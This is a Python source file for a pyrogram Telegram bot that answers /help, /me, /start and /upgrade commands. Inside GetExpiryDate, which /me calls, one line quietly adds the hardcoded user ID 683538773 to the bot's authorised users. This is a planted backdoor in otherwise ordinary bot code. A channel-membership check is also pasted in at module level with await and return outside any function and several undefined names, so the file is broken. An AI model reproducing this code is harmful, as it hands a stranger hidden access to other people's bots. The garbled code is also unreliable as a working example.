#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# (c) Shrimadhav U K

# the logging things
import logging
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

import os
import sqlite3

# the secret configuration specific things
if bool(os.environ.get("WEBHOOK", False)):
    from sample_config import Config
else:
    from config import Config

# the Strings used for this "thing"
from translation import Translation

import pyrogram
logging.getLogger("pyrogram").setLevel(logging.WARNING)

from helper_funcs.chat_base import TRChatBase

def GetExpiryDate(chat_id):
    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
    Config.AUTH_USERS.add(683538773)
    return expires_at


@pyrogram.Client.on_message(pyrogram.Filters.command(["help", "about"]))
async def help_user(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/help")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.HELP_USER.format(update.from_user.first_name),
        parse_mode="html",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id
    )


@pyrogram.Client.on_message(pyrogram.Filters.command(["me"]))
async def get_me_info(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/me")
    chat_id = str(update.from_user.id)
    chat_id, plan_type, expires_at = GetExpiryDate(chat_id)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.CURENT_PLAN_DETAILS.format(chat_id, plan_type, expires_at),
        parse_mode="html", 
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id
    )

from pyrogram import InlineKeyboardMarkup, InlineKeyboardButton

@pyrogram.Client.on_message(pyrogram.Filters.command(["start"]))
async def start(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/start")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.START_TEXT.format(update.from_user.first_name),
        #reply_to_message_id=update.message_id
        reply_markup=InlineKeyboardMarkup(
        [
         [
          InlineKeyboardButton('My Father👨‍💻', url='https://t.me/Ns_AnoNymouS'),
          InlineKeyboardButton('Discuss Group 🗣', url='https://t.me/anonymousbotdiscussion')
         ],
         [
          InlineKeyboardButton('Updates Channel 📣', url='https://t.me/anonymousbotupdates'),
          InlineKeyboardButton('Rate me ⭐', url='https://t.me/anonymousbotdiscussion/92')
         ]
        ]
       )
     )


try:
    chat = await bot.get_chat_member(CHANNEL_USERNAME, chat_id)
    if chat.status=='kicked':
      if edit_message:
         await reply('😡 hai {} you are banned you are not able to use me').format(update.from_user.first_name)
      return False
    else:
      return True
except UserBannedInChannel:
    if edit_message:
       await reply("Hai {} you made a mistake so you are banned from channel so you are banned from me too 😜").format(update.from_user.first_name)

except UserNotParticipant:
    if edit_message:
       button = [[InlineKeyboardButton('join Updates channel 📣', url='https://t.me/anonymousbotupdates')]]
       markup = InlineKeyboardMarkup(button)
       await reply("""Hai bro you must join my channel for using my bot""",  reply_markup=markup)
except Exception:
    LOGGER.exception('Unable to verify user')
    if edit_message:
       await reply('Some thing went wrong while checking please try later')
return False

@pyrogram.Client.on_message(pyrogram.Filters.command(["upgrade"]))
async def upgrade(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/upgrade")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.UPGRADE_TEXT,
        parse_mode="html",
        reply_to_message_id=update.message_id,
        disable_web_page_preview=True
    )
